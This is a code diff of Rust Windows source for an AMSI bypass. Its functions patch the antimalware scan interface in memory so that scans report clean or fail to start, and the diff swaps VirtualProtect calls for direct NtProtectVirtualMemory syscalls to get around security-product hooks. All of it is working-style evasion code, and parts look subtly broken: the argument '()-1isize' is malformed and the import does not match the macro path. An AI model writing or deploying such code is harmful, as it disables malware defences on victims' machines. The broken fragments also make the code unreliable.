@@ -3,7 +3,7 @@
 #[cfg(windows)]
 use winapi::um::libloaderapi::{LoadLibraryA, GetProcAddress, GetModuleHandleA};
 #[cfg(windows)]
-use winapi::um::memoryapi::VirtualProtect;
+use agent_syscalls::syscall;
 #[cfg(windows)]
 use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ, PAGE_READWRITE};
 #[cfg(windows)]
@@ -29,7 +29,7 @@ pub unsafe fn patch_amsi_memory() -> bool {
 
     // Memory Patching (FR-2): E9 / FF 25 / CC hooks bypassed by returning AMSI_RESULT_CLEAN directly.
     let mut old_protect = 0;
-    if VirtualProtect(amsi_scan as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+    if crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_scan as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
         return false;
     }
 
@@ -39,7 +39,7 @@ pub unsafe fn patch_amsi_memory() -> bool {
     core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_scan, patch.len());
 
     let mut temp = 0;
-    VirtualProtect(amsi_scan as _, 16, old_protect, &mut temp);
+    crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_scan as _, 16, old_protect, &mut temp);
     true
 }
 
@@ -53,7 +53,7 @@ pub unsafe fn fail_amsi_initialization() -> bool {
     if amsi_init.is_null() { return false; }
 
     let mut old_protect = 0;
-    if VirtualProtect(amsi_init as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
+    if crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_init as _, 16, PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
         return false;
     }
 
@@ -62,7 +62,7 @@ pub unsafe fn fail_amsi_initialization() -> bool {
     core::ptr::copy_nonoverlapping(patch.as_ptr(), amsi_init, patch.len());
 
     let mut temp = 0;
-    VirtualProtect(amsi_init as _, 16, old_protect, &mut temp);
+    crate::syscalls::syscall!("NtProtectVirtualMemory", ()-1isize, &mut amsi_init as _, 16, old_protect, &mut temp);
     true
 }
 
